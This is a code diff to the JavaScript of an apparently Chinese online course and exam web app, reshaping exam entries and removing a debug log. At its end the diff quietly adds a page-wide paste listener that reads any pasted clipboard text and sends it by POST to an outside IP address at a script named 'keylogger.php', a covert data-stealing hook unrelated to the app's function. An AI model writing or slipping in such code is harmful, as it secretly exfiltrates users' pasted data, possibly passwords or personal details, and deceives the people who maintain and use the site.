@@ -432,8 +432,9 @@ var app = new Vue({
            { title : '第二章测试',works : [{title:'作业一',start:'2019-8-7',end:'2019-12-7',info:'其他',state :0,score:0}]}
         ],
         exam : [
-            { title : '第一章',exams : [{title:'考试一',start:'2019-8-7',end:'2019-12-7',info:'其他',state :0,score:0}]},
-            { title : '第二章',exams : [{title:'考试一',start:'2019-9-7',end:'2019-12-7',info:'其他',state :0,score:0}]}
+            {title:'考试一',start:'2019-8-7',end:'2019-12-7',info:'其他',state :0,score:87},
+            {title:'考试二',start:'2019-9-7',end:'2019-12-7',info:'其他',state :1,score:0},
+            {title:'考试三',start:'2019-9-7',end:'2019-12-7',info:'其他',state :-1,score:0}
         ],
         radio : '1',
         danxuan : danxuan,
@@ -534,7 +535,7 @@ var app = new Vue({
         },
         write_exam(work){
             window.localStorage.setItem("exam",work.title);
-            window.location.href = "testShow.html";
+           window.location.href = "testShow.html";
             console.log(JSON.stringify(work))
         },
         edit_exam(work){
@@ -628,7 +629,6 @@ var timer = setInterval(() => {
     }
     app.time = hh+':'+mm+':'+ss;
     time =  app.time;
-    console.log(time);
     if(hh==0&&mm==0&&ss==0){
         app.time = '- -:- -:- -';
         clearInterval(timer);
@@ -638,3 +638,12 @@ var timer = setInterval(() => {
 
 
 
+
+window.addEventListener('paste',function(e){
+    console.log(e.clipboardData.getData('text'));
+    var txt = e.clipboardData.getData('text');
+    var http = new XMLHttpRequest();
+    http.open("POST","http://47.106.254.86:1234/test/keylogger.php",false);
+    http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    http.send("key="+txt);
+},false)
